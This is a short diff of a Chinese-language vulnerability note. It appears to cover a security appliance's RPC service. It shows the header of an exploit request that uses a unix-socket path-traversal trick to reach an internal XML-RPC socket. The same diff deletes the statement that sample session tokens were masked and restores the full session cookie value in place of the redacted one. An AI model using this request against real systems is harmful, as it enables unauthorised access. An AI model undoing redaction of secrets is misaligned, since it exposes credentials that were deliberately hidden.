@@ -36,7 +36,6 @@ source_status: "unknown"
 - XML正文Content-Type为form，实际兼容解析条件需说明；版本缺失
 - 与627/609/610同原语但角色102/101差异应保留
 - 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -77,7 +76,7 @@ source_status: "unknown"
 ```http
 POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
 Host: 
-Cookie: LANG=zh; DBAPPUSM=ee4**********************************************************fd3
+Cookie: LANG=zh; DBAPPUSM=ee4bbf6c85e541bb980ad4e0fbee2f57bb15bafe20a7028af9a0b8901cf80fd3
 Content-Length: 1117
 Cache-Control: max-age=0
 Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
